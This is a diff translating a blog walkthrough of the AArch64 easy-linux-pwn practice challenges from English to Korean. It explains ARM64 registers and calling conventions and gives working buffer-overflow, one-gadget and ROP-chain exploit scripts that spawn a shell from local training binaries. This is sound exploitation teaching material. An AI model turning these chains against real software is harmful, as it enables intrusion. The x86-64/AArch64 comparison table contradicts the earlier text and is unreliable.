@@ -1,7 +1,7 @@
 ---
-title: "AArch64 Binary Exploitation: easy_linux_pwn"
+title: "AArch64 바이너리 익스플로잇: easy_linux_pwn"
 date: 2020-01-01
-description: "AArch64 exploitation walkthrough covering calling conventions, stack layout differences from x86-64, and ROP chain construction"
+description: "AArch64 호출 규약, x86-64와의 스택 레이아웃 차이, ROP 체인 구성을 다루는 ARM64 익스플로잇 실습 워크스루"
 tags: ["AArch64", "ARM64", "pwn", "ROP", "binary-exploitation", "Linux"]
 categories: ["Research"]
 authors:
@@ -10,84 +10,86 @@ authors:
     image: "https://github.com/Phantomn.png"
 ---
 
-## Introduction
+## 소개
 
-While looking for AArch64 binary exploitation challenges, I found the [easy-linux-pwn](https://github.com/xairy/easy-linux-pwn.git) repository — a collection of small exploitation exercises organized by architecture.
+AArch64 바이너리 익스플로잇 예제를 찾다가 [easy-linux-pwn](https://github.com/xairy/easy-linux-pwn.git) 레포지토리를 발견했다. 아키텍처별로 다양한 소형 익스플로잇 연습 문제들이 정리되어 있다.
 
-![easy-linux-pwn repo overview](/images/blog/aarch64-easy-linux-pwn/Untitled.png)
+![easy-linux-pwn 레포지토리 개요](/images/blog/aarch64-easy-linux-pwn/Untitled.png)
 
-This post works through the ARM64 challenges, covering the architecture fundamentals needed to understand the exploit differences from x86-64.
+이 포스트는 ARM64 문제들을 풀어나가면서, x86-64와 다른 익스플로잇 방식을 이해하기 위해 필요한 AArch64 아키텍처 기초를 함께 다룬다.
 
-## AArch64 Architecture Primer
+## AArch64 아키텍처 기초
 
-### Registers
+### 레지스터
 
-AArch64 provides 31 general-purpose registers: `X0` through `X30` (64-bit) and their lower 32-bit aliases `W0` through `W30`.
+AArch64는 31개의 범용 레지스터를 제공한다. `X0`~`X30`(64비트)과, 그 하위 32비트에 접근하는 `W0`~`W30` 별칭이 존재한다.
 
 ### PSTATE
 
-PSTATE provides processor state information and is specific to AArch64/AArch32 or shared between both. It does not map 1:1 to the ARMv7 CPSR.
+PSTATE는 프로세서 상태(Processor STATE) 정보를 제공한다. AArch64/AArch32 전용 속성과 두 모드 공통 속성으로 구성되며, ARMv7의 CPSR과 1:1로 대응되지 않는다.
 
-### Special-Purpose Registers
+### 특수 목적 레지스터
 
-AArch64 provides several special-purpose registers alongside the general-purpose ones:
+AArch64는 범용 레지스터 외에도 여러 특수 목적 레지스터를 제공한다.
 
-![AArch64 special-purpose registers](/images/blog/aarch64-easy-linux-pwn/Untitled-1.png)
+![AArch64 특수 목적 레지스터](/images/blog/aarch64-easy-linux-pwn/Untitled-1.png)
 
 ### ELR (Exception Link Register)
 
-ELR stores the return address when returning from an exception. The processor copies the appropriate ELR value for the current Exception Level into PC. It exists for each Exception Level except EL0 (which has no return target), named `ELR_EL[n]`.
+ELR은 익셉션에서 복귀할 때 돌아갈 실행 위치를 저장하는 레지스터다. 프로세서가 현재 Exception Level에 해당하는 ELR 값을 PC에 복사한다. 복귀할 대상이 없는 EL0를 제외한 각 익셉션 레벨마다 존재하며, 이름은 `ELR_EL[n]`이다.
 
 ### SPSR (Saved Program Status Register)
 
-SPSR saves the processor state at a specific point in time. When an exception occurs, the processor saves the current state from PSTATE into SPSR. On exception return, the processor restores SPSR back into PSTATE. Like ELR, SPSR exists for each Exception Level except EL0, named `SPSR_EL[n]`.
+SPSR은 특정 시점의 프로세서 상태를 저장하는 레지스터다. 익셉션이 발생하면 프로세서가 PSTATE에서 SPSR로 현재 상태를 저장하고, 익셉션에서 복귀할 때 SPSR에서 PSTATE로 복원한다. ELR과 마찬가지로 EL0를 제외한 각 익셉션 레벨마다 존재하며, 이름은 `SPSR_EL[n]`이다.
 
 ### XZR / WZR
 
-ZR is a zero register: when used as a source, it reads as zero; when used as a destination, the result is discarded. `XZR` is the 64-bit form, `WZR` is 32-bit.
+ZR은 제로 레지스터다. 소스로 사용하면 0이 읽히고, 목적지로 사용하면 결과가 버려진다. `XZR`은 64비트, `WZR`은 32비트 형태다.
 
 ### SP / WSP
 
-SP points to the current stack location. It exists at each Exception Level (`SP_EL[n]`), and at levels other than EL0, either `SP_EL[n]` or `SP_EL0` can be selected as the active stack pointer. `WSP` is the 32-bit stack pointer.
+SP는 스택의 현재 위치를 가리키는 레지스터다. EL0를 포함한 각 익셉션 레벨마다 존재하며 이름은 `SP_EL[n]`이다. `WSP`는 32비트 스택 포인터다.
 
-### System Registers
+한 가지 특이한 점은, EL0 이외의 익셉션 레벨에서는 해당 레벨의 `SP_EL[n]`과 `SP_EL0` 중 하나를 선택하여 스택 포인터로 사용할 수 있다는 것이다.
 
-System configuration in AArch64 is controlled through system registers, accessed via the `MSR` and `MRS` instructions. AArch64 does not support co-processors, so there is no cp15-style interface as in ARMv7. The number suffix in a system register name indicates the lowest Exception Level allowed to access it.
+### 시스템 레지스터
 
-Example — reading `TTBR0_EL1` into `x0`:
+AArch64에서 시스템 설정은 시스템 레지스터를 통해 제어하며, `MSR`과 `MRS` 명령어로 접근한다. AArch64는 코프로세서(Co-processor)를 지원하지 않으므로 ARMv7처럼 cp15 연산 방식의 인터페이스는 제공되지 않는다. 시스템 레지스터 이름 끝의 숫자는 접근 가능한 가장 낮은 익셉션 레벨을 나타낸다.
+
+`TTBR0_EL1` 레지스터의 값을 `x0`으로 읽어오는 예:
 
 ```c
 MRS x0, TTBR0_EL1
 ```
 
-Writing `x0` into `TTBR0_EL1`:
+반대로 `x0` 값을 `TTBR0_EL1`에 쓰는 예:
 
 ```c
 MSR TTBR0_EL1, x0
 ```
 
-## ABI: Register Usage Conventions
+## ABI: 레지스터 사용 규약
 
-Each architecture defines calling conventions so that binaries can interoperate. For AArch64, the relevant standard is **AAPCS64** (Procedure Call Standard for the ARM 64-bit Architecture), which defines the interface between assembly and C and covers function calling conventions.
+아키텍처마다 바이너리들이 상호 동작하기 위한 규칙이 존재하는데, 이를 ABI(Application Binary Interface)라고 한다. AArch64의 경우 **AAPCS64**(Procedure Call Standard for the ARM 64-bit Architecture)가 이를 정의하며, 어셈블리와 C 사이의 인터페이스 및 함수 호출 규약을 다룬다.
 
-![AAPCS64 register roles](/images/blog/aarch64-easy-linux-pwn/Untitled-2.png)
+![AAPCS64 레지스터 역할](/images/blog/aarch64-easy-linux-pwn/Untitled-2.png)
 
-| Registers | Role |
-|-----------|------|
-| X0–X7 | Parameters and return values; X0 holds the return value |
-| X8 | Indirect result location register (address for returning large values) |
-| X9–X15 | Caller-saved temporary registers (caller must save if needed across a call) |
-| X16–X17 | Intra-procedure-call scratch registers (IP0, IP1) |
-| X18 | Platform register |
-| X19–X28 | Callee-saved registers (callee must preserve) |
+| 레지스터 | 역할 |
+|----------|------|
+| X0~X7 | 파라미터 및 반환값 저장; X0에 함수 반환값 저장 |
+| X8 | 간접 결과 위치 레지스터 (대형 반환값의 주소 전달에 사용) |
+| X9~X15 | Caller 저장 임시 레지스터 (호출자가 필요 시 자신의 스택에 저장) |
+| X16~X17 | 인트라 프로시저 스크래치 레지스터 (IP0, IP1) |
+| X18 | 플랫폼 레지스터 |
+| X19~X28 | Callee 저장 레지스터 (피호출자가 보존 의무) |
 | X29 | Frame Pointer (FP) |
 | X30 | Procedure Link Register (LR) |
 
-The key difference from x86-64: the **return address is stored in LR (X30)**, not pushed onto the stack as the `call` instruction does in x86-64. X30 is saved onto the stack in the function prologue only when the function makes further calls.
+x86-64와의 핵심 차이점: **리턴 주소가 LR(X30)에 저장**된다. x86-64에서 `call` 명령어가 리턴 주소를 스택에 푸시하는 방식과 다르다. X30은 함수가 추가 호출을 할 때만 함수 프롤로그에서 스택에 저장된다.
 
 ---
 
-## Challenge Walkthroughs
+## 문제 풀이
 
 ### 00-hello-pwn
 
@@ -101,7 +103,7 @@ int main() {
 }
 ```
 
-Just run it. This is the goal state for every pwn challenge.
+그냥 실행하면 끝난다. 모든 pwn 문제의 목표 상태랄까.
 
 ```
 # id
@@ -141,7 +143,7 @@ int main(int argc, char** argv) {
 }
 ```
 
-Write `0xdeadbabebeefc0de` into the struct member `x` by overflowing `buffer`. The struct lays out `buffer[128]` immediately before `x`, so 128 bytes of padding followed by the target value is sufficient.
+구조체 멤버 `x`에 `0xdeadbabebeefc0de`를 넣어주면 익스 성공이다. 구조체에서 `buffer[128]` 바로 뒤에 `x`가 위치하므로, 128바이트 패딩 후 원하는 값을 이어 붙이면 된다.
 
 ```python
 #!/usr/bin/python
@@ -191,11 +193,11 @@ int main(int argc, char** argv) {
 }
 ```
 
-The goal is to redirect execution to `not_called`. In x86-64, `call` pushes the return address onto the stack and `ret` pops it back into RIP. AArch64 is different.
+목표는 실행 흐름을 `not_called`로 리다이렉트하는 것이다. x86-64에서는 `call`이 리턴 주소를 스택에 푸시하고 `ret`이 그걸 RIP로 팝한다. AArch64는 방식이 다르다.
 
-Let's hand-trace the assembly to understand the stack layout.
+어셈블리를 핸드 트레이싱해서 스택 레이아웃을 파악해보자.
 
-**main function disassembly:**
+**main 함수 디스어셈블:**
 
 ```
 0x0000000000400724 <+0>:   stp  x29, x30, [sp, #-32]!
@@ -208,17 +210,17 @@ Let's hand-trace the assembly to understand the stack layout.
 0x0000000000400740 <+28>:  ret
 ```
 
-Step by step:
-1. `stp x29, x30, [sp, #-32]!` — saves x29 (FP) and x30 (LR) to `[sp]` and `[sp+8]`, then `sp -= 32` (function prologue)
-2. `mov x29, sp` — set frame pointer
-3. `str w0, [x29, #28]` — save argc
-4. `str x1, [x29, #16]` — save argv
-5. `bl 0x4006e0` — branch-and-link to `vulnerable`; x30 (LR) is set to the return address (`0x400738`)
-6. `mov w0, #0x0` — set return value
-7. `ldp x29, x30, [sp], #32` — restore x29 and x30 from stack, then `sp += 32`
-8. `ret` — jump to x30
+단계별 분석:
+1. `stp x29, x30, [sp, #-32]!` — x29(FP)와 x30(LR)을 `[sp]`와 `[sp+8]`에 저장, `sp -= 32` (함수 프롤로그)
+2. `mov x29, sp` — 프레임 포인터 설정
+3. `str w0, [x29, #28]` — argc 저장
+4. `str x1, [x29, #16]` — argv 저장
+5. `bl 0x4006e0` — `vulnerable`로 branch-and-link; x30(LR)에 리턴 주소(`0x400738`) 저장
+6. `mov w0, #0x0` — 반환값 설정
+7. `ldp x29, x30, [sp], #32` — 스택에서 x29와 x30 복원, `sp += 32`
+8. `ret` — x30으로 점프
 
-**vulnerable function disassembly:**
+**vulnerable 함수 디스어셈블:**
 
 ```
 0x00000000004006e0 <+0>:   stp  x29, x30, [sp, #-144]!
@@ -240,29 +242,29 @@ Step by step:
 0x0000000000400720 <+64>:  ret
 ```
 
-Key observations:
-- `stp x29, x30, [sp, #-144]!` — saves x29 and x30 at the top of the 144-byte stack frame
-- `add x0, x29, #0x10` — `buffer` starts at `x29 + 0x10`
-- `read(0, buffer, 0x100)` — reads 256 bytes into a 128-byte buffer
-- The epilogue `ldp x29, x30, [sp], #144` restores x29 and x30 from the stack, then `ret` jumps to x30
+핵심 관찰:
+- `stp x29, x30, [sp, #-144]!` — 144바이트 스택 프레임 상단에 x29와 x30 저장
+- `add x0, x29, #0x10` — `buffer`는 `x29 + 0x10`에 위치
+- `read(0, buffer, 0x100)` — 128바이트 버퍼에 256바이트 읽기 (overflow 가능)
+- 에필로그 `ldp x29, x30, [sp], #144`가 스택에서 x29와 x30을 복원한 뒤 `ret`이 x30으로 점프
 
-The key insight: the saved **x30 (LR) lives at `sp + 8`** in the vulnerable frame (immediately after the saved x29). The buffer starts at `x29 + 0x10`.
+핵심 인사이트: **저장된 x30(LR)은 vulnerable 프레임의 `sp + 8`에 위치**한다(저장된 x29 바로 다음). buffer는 `x29 + 0x10`에서 시작한다.
 
-To calculate the offset from `buffer` to the saved x30:
+`buffer`에서 저장된 x30까지의 오프셋 계산:
 
 ```
-saved_x30 is at: sp + 8
-buffer    is at: x29 + 0x10 = sp + 0x10  (since x29 == sp after prologue)
+saved_x30: sp + 8
+buffer:    x29 + 0x10 = sp + 0x10  (프롤로그 후 x29 == sp)
 ```
 
-So `saved_x30 - buffer = sp + 8 - (sp + 0x10)` — but we need the offset within the full stack, including main's frame below. Using concrete addresses from the debugger session:
+디버거에서 얻은 실제 주소를 기반으로:
 
 ```python
-saved_x30_addr = 0x4000800340 + 8  # stp x29, x30, [sp, #-32]! in main
+saved_x30_addr = 0x4000800340 + 8  # main의 stp x29, x30, [sp, #-32]!
 buffer_addr    = 0x40008002c0
 ```
 
-The offset equals `saved_x30_addr - buffer_addr`.
+오프셋은 `saved_x30_addr - buffer_addr`이다.
 
 ```python
 #!/usr/bin/python
@@ -290,7 +292,7 @@ p.write(payload)
 p.interactive()
 ```
 
-The x30 register acts like `push ebp` in x86 terms — it marks the boundary of the frame. Computing the distance between `buffer` and the saved x30 reveals the entire stack frame size minus the buffer offset.
+x30 레지스터는 x86의 `push ebp`와 유사한 역할을 한다. `buffer`와 저장된 x30 사이의 거리를 계산하면 buffer 오프셋을 제외한 전체 스택 프레임 크기를 알 수 있다.
 
 ### 03-one-gadget
 
@@ -313,26 +315,26 @@ int main(int argc, char** argv) {
 }
 ```
 
-This challenge uses a one-shot gadget (one-gadget). The structure is the same buffer overflow — we just need to reach a gadget in libc that calls `execl("/bin/sh", ...)`.
+이번 문제는 one-shot 가젯(one-gadget)을 이용한 익스다. 구조는 같은 버퍼 오버플로이며, `execl("/bin/sh", ...)`을 호출하는 libc 가젯 하나만 찾으면 된다.
 
-Let's trace the stack layout visually. At the point right after `read` in `vulnerable`, the stack looks like this (printed from `$sp`):
+스택 레이아웃을 시각적으로 정리해보자. `vulnerable` 함수의 `read` 직후 `$sp`를 출력하면:
 
-![Stack layout after read in vulnerable](/images/blog/aarch64-easy-linux-pwn/Untitled-3.png)
+![read 이후 vulnerable의 스택 레이아웃](/images/blog/aarch64-easy-linux-pwn/Untitled-3.png)
 
-- Green (bottom): main's saved x29 and x30 (pushed in main's prologue)
-- Red: `buffer[128]`
-- Yellow: vulnerable's saved x29 and x30
+- 초록색 (하단): main의 함수 프롤로그에서 저장된 x29, x30
+- 빨간색: `buffer[128]`
+- 노란색: vulnerable 함수 프롤로그에서 저장된 x29, x30
 
-What we can overwrite: `buffer` and main's saved x30 (LR).
+덮어쓸 수 있는 범위: `buffer`와 main의 저장된 x30(LR).
 
-The epilogue sequence:
+에필로그 시퀀스:
 
 ```
 0x0000000000400670 <+60>:  ldp  x29, x30, [sp], #144
 0x0000000000400674 <+64>:  ret
 ```
 
-After `vulnerable` returns, main's own epilogue:
+`vulnerable`이 반환된 후 main의 에필로그:
 
 ```
 0x0000000000400738 <+20>:  mov  w0, #0x0
@@ -340,31 +342,31 @@ After `vulnerable` returns, main's own epilogue:
 0x0000000000400740 <+28>:  ret
 ```
 
-This second epilogue loads x29 and x30 from the stack and then jumps to x30. We want x30 to point to our gadget.
+이 두 번째 에필로그가 스택에서 x29와 x30을 로드한 뒤 x30으로 점프한다. 우리가 원하는 가젯 주소를 x30에 넣으면 된다.
 
-The one-gadget calls `execl("/bin/sh", x1)`. For it to work, x1 must be NULL (or point to zero):
+one-gadget은 `execl("/bin/sh", x1)`을 호출한다. 동작하려면 x1이 NULL이어야 한다:
 
-![one-gadget target](/images/blog/aarch64-easy-linux-pwn/Untitled-8.png)
+![one-gadget 대상](/images/blog/aarch64-easy-linux-pwn/Untitled-8.png)
 
-We need a gadget that loads x1 from a controlled location and then gives us a second redirect. A suitable gadget:
+x1을 원하는 값으로 로드하고 두 번째 리다이렉트를 제공하는 가젯이 필요하다:
 
 ```
 0x2c490 : ldr x1, [x29, #0x18]; ldp x29, x30, [sp], #0x20; mov x0 x1; ret;
 ```
 
-This gadget loads x1 from `[x29 + 0x18]` and loads a new x30 from the stack.
+이 가젯은 `[x29 + 0x18]`에서 x1을 로드하고, 스택에서 새 x30을 로드한다.
 
-**Payload layout:**
+**페이로드 레이아웃:**
 
 ```
 | buffer[128] | zero_addr - 0x18 | ldr_x1_x30_ret | "B"x16 | p64(0) | execl_gadget |
 |             |      x29         |      x30        | dummy  |   x29  |      x30     |
 ```
 
-We fill the buffer, then:
-1. Set x29 to `zero_addr - 0x18` so that `ldr x1, [x29, #0x18]` loads from `zero_addr` (giving x1 = 0)
-2. Set x30 to the `ldr_x1_x30_ret` gadget
-3. After that gadget, x30 becomes the one-gadget address
+buffer를 채운 뒤:
+1. x29를 `zero_addr - 0x18`로 설정해 `ldr x1, [x29, #0x18]`가 `zero_addr`에서 로드 (x1 = 0)
+2. x30을 `ldr_x1_x30_ret` 가젯으로 설정
+3. 그 가젯 이후 x30이 one-gadget 주소가 됨
 
 ```python
 #!/usr/bin/python
@@ -393,10 +395,10 @@ zero_addr   = libc_base + libc.search(p64(0)).next()
 
 payload  = ''
 payload += "A" * (saved_x30_addr - buffer_addr - 8)
-payload += p64(zero_addr - 0x18)       # x29: ldr x1, [x29, #0x18] loads from zero_addr
-payload += p64(ldr_x1_x30_ret_gadget)  # x30: jump to ldr gadget
+payload += p64(zero_addr - 0x18)       # x29: ldr x1, [x29, #0x18]가 zero_addr에서 로드
+payload += p64(ldr_x1_x30_ret_gadget)  # x30: ldr 가젯으로 점프
 payload += "B" * 16                    # dummy
-payload += p64(0)                      # x29 for next frame
+payload += p64(0)                      # x29 (다음 프레임)
 payload += p64(one_gadget_addr)        # x30: one-gadget
 
 p.readuntil('> ')
@@ -425,23 +427,23 @@ int main(int argc, char** argv) {
 }
 ```
 
-Same overflow, but solved with a classic ROP chain to call `system("/bin/sh")`.
+동일한 오버플로지만, 이번에는 `system("/bin/sh")`을 호출하는 고전적인 ROP 체인으로 해결한다.
 
-The goal: get `x0 = &"/bin/sh"` and call `system`. In x86-64 you typically chain `pop rdi; ret` gadgets. In AArch64 the equivalent approach uses gadgets that load multiple registers at once via `ldp`.
+목표: `x0 = &"/bin/sh"` 후 `system` 호출. x86-64에서는 보통 `pop rdi; ret` 가젯을 체이닝한다. AArch64에서는 `ldp`로 여러 레지스터를 한 번에 로드하는 방식을 사용한다.
 
-Two gadgets found in libc:
+libc에서 찾은 두 가젯:
 
 ```
 ldp_x24_x25_x30_ret: ldp x24, x25, [sp, #0x38]; ldp x29, x30, [sp], #0x50; ret
 mov_x0_x24_blr_x25:  mov x0, x24; blr x25;
 ```
 
-**Chain:**
-1. Jump to `ldp_x24_x25_x30_ret` — this loads x24 and x25 from `[sp + 0x38]` and a new x30 from the stack
-2. x30 is set to `mov_x0_x24_blr_x25` — when `ret` fires, it lands here
-3. `mov_x0_x24_blr_x25` sets x0 to x24 (`&"/bin/sh"`) and calls x25 (`system`)
+**체인 흐름:**
+1. `ldp_x24_x25_x30_ret`로 점프 — `[sp + 0x38]`에서 x24, x25를 로드하고 스택에서 새 x30을 로드
+2. x30을 `mov_x0_x24_blr_x25`로 설정 — `ret` 실행 시 여기로 착지
+3. `mov_x0_x24_blr_x25`가 x0을 x24(`&"/bin/sh"`)로 설정하고 x25(`system`)를 호출
 
-**Payload layout:**
+**페이로드 레이아웃:**
 
 ```
 | buffer + dummy | ldp_x24_x25_x30_ret | dummy[16] | p64(0) | mov_x0_x24_blr_x25 | dummy(0x38-16) | &/bin/sh | system |
@@ -473,11 +475,11 @@ p = process(binary_path)
 
 payload  = ''
 payload += 'a' * (saved_x30_addr - buffer_addr)
-payload += p64(ldp_x24_x25_x30_ret_addr)  # x30: land here first
+payload += p64(ldp_x24_x25_x30_ret_addr)  # x30: 여기 먼저 착지
 payload += 'b' * 16                        # dummy
 payload += p64(0)                          # x29
-payload += p64(mov_x0_x24_blr_x25_addr)   # x30: next ret target
-payload += 'c' * (0x38 - 16)              # pad to reach sp+0x38
+payload += p64(mov_x0_x24_blr_x25_addr)   # x30: 다음 ret 목적지
+payload += 'c' * (0x38 - 16)              # sp+0x38까지 패딩
 payload += p64(bin_sh_addr)               # x24 -> "/bin/sh"
 payload += p64(system_addr)               # x25 -> system
 
@@ -488,22 +490,22 @@ p.interactive()
 
 ---
 
-## Stack Layout: AArch64 vs x86-64
+## 스택 레이아웃: AArch64 vs x86-64
 
-The core conceptual difference that trips up x86-64 exploitation practitioners working on AArch64 for the first time:
+x86-64 익스플로잇을 해온 사람이 처음 AArch64를 접할 때 가장 혼란스러운 핵심 차이점:
 
-| Aspect | x86-64 | AArch64 |
-|--------|--------|---------|
-| Return address storage | `call` pushes RIP onto stack automatically | `bl` writes return address into X30 (LR) |
-| Stack save | Only if a nested call is made | Prologue `stp x29, x30, [sp, #-N]!` saves both FP and LR |
-| Ret instruction | `ret` pops RIP from stack | `ret` jumps to X30 |
-| Overflow target | Overwrite return address directly on stack | Overwrite saved X30 at known stack offset |
-| Gadget chaining | `pop rdi; ret` style | `ldp x0, x1, [sp], #N; ret` style — multiple regs per gadget |
+| 항목 | x86-64 | AArch64 |
+|------|--------|---------|
+| 리턴 주소 저장 | `call`이 자동으로 RIP를 스택에 푸시 | `bl`이 리턴 주소를 X30(LR)에 기록 |
+| 스택 저장 시점 | 중첩 호출이 있을 때만 | 프롤로그 `stp x29, x30, [sp, #-N]!`로 항상 FP와 LR을 함께 저장 |
+| ret 명령어 | 스택에서 RIP를 팝 | X30으로 점프 |
+| 오버플로 목표 | 스택의 리턴 주소를 직접 덮어씀 | 알려진 스택 오프셋의 저장된 X30을 덮어씀 |
+| 가젯 체이닝 | `pop rdi; ret` 스타일 | `ldp x0, x1, [sp], #N; ret` 스타일 — 가젯 하나로 여러 레지스터 처리 |
 
-The debugging approach shown in challenge 03 is essential for AArch64 exploitation: use `qemu-aarch64-static` with the `-g` flag to attach GDB and directly observe how the `ldp` epilogues move values through registers before the final `ret`.
+03번 문제에서 보여준 디버깅 방법은 AArch64 익스플로잇에서 필수다. `qemu-aarch64-static`에 `-g` 플래그를 붙여 GDB를 연결하고, `ldp` 에필로그가 최종 `ret` 전에 레지스터들을 어떻게 이동시키는지 직접 관찰해야 한다.
 
 ```bash
 qemu-aarch64-static -L /usr/aarch64-linux-gnu -g 1234 ./bin/arm64/03-one-gadget <<< $(perl -e 'print "A"x128, "B"x8, "C"x8')
 ```
 
-This makes the stack frame transitions concrete and removes the guesswork from offset calculations.
+이렇게 하면 스택 프레임 전환이 눈에 보이고, 오프셋 계산에서 추측을 없앨 수 있다.
